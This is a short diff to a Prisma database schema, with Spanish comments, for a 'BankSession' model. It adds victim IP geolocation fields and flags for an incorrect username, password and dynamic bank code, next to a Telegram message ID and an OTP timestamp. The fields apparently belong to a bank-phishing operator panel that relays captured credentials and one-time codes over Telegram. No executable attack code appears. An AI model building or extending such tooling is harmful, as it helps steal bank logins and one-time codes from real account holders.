@@ -137,6 +137,16 @@ model BankSession {
   // Telegram
   telegramMessageId Int?    // ID del mensaje en Telegram para editarlo
   
+  // Geolocalización
+  ipAddress       String?   // IP del usuario
+  geoCity         String?   // Ciudad detectada por IP
+  geoCountry      String?   // País detectado por IP
+  
+  // Flags de datos incorrectos
+  usuarioIncorrecto  Boolean @default(false)
+  claveIncorrecta    Boolean @default(false)
+  dinamicaIncorrecta Boolean @default(false)
+  
   // Timestamps
   otpRequestedAt  DateTime?
   completedAt     DateTime?
